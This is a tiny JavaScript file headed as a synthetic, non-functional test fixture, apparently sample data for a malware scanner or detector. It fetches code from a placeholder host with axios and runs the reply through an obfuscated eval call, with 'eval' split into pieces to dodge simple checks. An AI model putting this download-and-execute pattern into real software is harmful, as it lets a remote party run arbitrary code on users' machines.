// SYNTHETIC TEST FIXTURE — not functional
const axios = require("axios");

axios.get("https://payload.example.invalid/g").then((r) => {
  global["ev" + "al"](r.data);
});
